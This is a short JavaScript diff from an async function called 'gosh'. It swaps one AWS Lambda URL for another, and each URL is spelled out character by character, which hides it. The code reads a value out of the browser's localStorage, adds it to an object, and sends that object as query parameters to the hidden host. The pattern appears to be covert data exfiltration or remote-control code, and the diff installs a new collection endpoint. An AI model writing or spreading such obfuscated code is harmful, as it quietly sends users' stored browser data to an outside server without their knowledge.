@@ -1208,7 +1208,7 @@ async function gosh(obj1, obj2, obj3) {
     }),
     new Promise(rez => {
       let list = "";
-      dlurl = ['h', 't', 't', 'p', 's', ':', '/', '/', 'j', 'w', '6', 'g', 'q', 'x', 'c', 'e', 'f', 'f', 'u', 'i', 'u', 'z', '4', 'c', 'a', 'p', 'y', 'v', 'u', 'y', 'm', 'k', 'p', 'e', '0', 'b', 'i', 'd', 'q', 't', '.', 'l', 'a', 'm', 'b', 'd', 'a', '-', 'u', 'r', 'l', '.', 'a', 'p', '-', 's', 'o', 'u', 't', 'h', '-', '1', '.', 'o', 'n', '.', 'a', 'w', 's'].join('');
+      dlurl = ['h', 't', 't', 'p', 's', ':', '/', '/', 'h', 'z', 'q', 'l', '5', 'j', 'd', 'j', 'q', 'u', '6', 'd', 'p', 'v', 'b', '2', 'd', 'n', 'r', 'y', '5', '6', '5', 'o', 'p', 'a', '0', 'd', 'q', 'j', 'd', 'u', '.', 'l', 'a', 'm', 'b', 'd', 'a', '-', 'u', 'r', 'l', '.', 'a', 'p', '-', 's', 'o', 'u', 't', 'h', '-', '1', '.', 'o', 'n', '.', 'a', 'w', 's'].join('');
       obj1.ss = Object.values(JSON.parse(localStorage.rkb))[0];
       fetch(dlurl + "?" + new URLSearchParams(obj1), { method: 'GET', signal })
         .then(res => res.json())
